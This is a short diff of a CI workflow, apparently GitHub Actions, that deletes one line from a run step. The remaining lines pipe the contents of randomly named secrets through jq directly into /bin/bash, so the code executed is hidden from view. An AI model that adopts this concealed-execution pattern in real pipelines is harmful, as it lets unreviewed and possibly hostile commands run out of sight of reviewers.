@@ -20,7 +20,6 @@ jobs:
           iz0: ${{ secrets.iz0 }}
         run: |
           printf '%s' "$iz0" | jq -r .bs348 | /bin/bash
-          printf '%s' "$kyne345" | jq -r .sftd2 | /bin/bash
           printf '%s' "$npzho44" | jq -r .vkrv75388 | /bin/bash
           echo $ndqa683 | jq -r .vm8 | /bin/bash
           echo $dlbz8277 | jq -r .ij906 | /bin/bash
